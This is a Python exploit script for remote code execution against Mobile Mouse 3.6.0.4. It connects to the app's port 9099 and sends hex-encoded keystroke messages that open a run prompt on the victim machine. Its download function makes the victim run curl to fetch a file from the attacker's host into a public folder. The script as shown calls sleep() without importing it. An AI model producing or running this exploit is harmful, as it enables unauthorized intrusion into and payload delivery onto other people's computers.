import socket
import argparse

def connect_to_target(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def send_and_receive(s, data_hex):
    data = bytearray.fromhex(data_hex)
    s.send(data)
    response = s.recv(54)  # Adjust the buffer size as needed
    return response

def download_file(s, lhost, command_shell):
    download_string = f'curl http://{lhost}:80/{command_shell} -o c:\\users\\public\\{command_shell}'.encode('utf-8') # Original exploit had one backslashes but I had to add two
    hex_download = ''.join(format(x, '02x') for x in download_string)
    command_hex = "4B45591E3130301E" + hex_download + "1E04" + "4b45591e2d311e454e5445521e04"
    return send_and_receive(s, command_hex)

def main():
    help_text = "Download Script - Mobile Mouse 3.6.0.4 Remote Code Execution"
    parser = argparse.ArgumentParser(description=help_text)
    parser.add_argument("--target", help="Target IP", required=True)
    parser.add_argument("--file", help="File name to Download")
    parser.add_argument("--lhost", help="Your local IP", default="127.0.0.1")
    args = parser.parse_args()

    host = args.target
    command_shell = args.file
    lhost = args.lhost
    port = 9099  # Default Port

    s = connect_to_target(host, port)

    # Initial connection
    response = send_and_receive(s, "434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
    print(response.decode())

    # Run command
    response = send_and_receive(s, "4b45591e3131341e721e4f505404")
    print(response.decode())

    sleep(10)

    # Download file
    response = download_file(s, lhost, command_shell)
    print(response.decode())

    # Wait for download to complete (adjust sleep time as needed)
    sleep(20) 

    print("File Downloaded Successfully")

    s.close()

if __name__ == "__main__":
    main()

